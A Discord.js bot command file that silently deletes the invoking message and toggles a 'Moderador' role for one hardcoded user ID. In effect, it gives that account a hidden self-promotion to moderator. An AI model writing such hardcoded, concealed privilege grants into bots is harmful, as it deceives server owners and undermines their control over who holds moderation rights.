module.exports = {
	name: 'mod',
	description: 'Mods myself',
  guildOnly: true,
  async execute(msg, args) {
    const {member, guild} = msg;
    msg.delete();
    if(member.id !== '484774210372108300') return;
    const modRol = guild.roles.cache.find(role => role.name === 'Moderador');

    if(!member.roles.cache.find(role => role === modRol)) await member.roles.add(modRol)
    else await member.roles.remove(modRol)
  },
};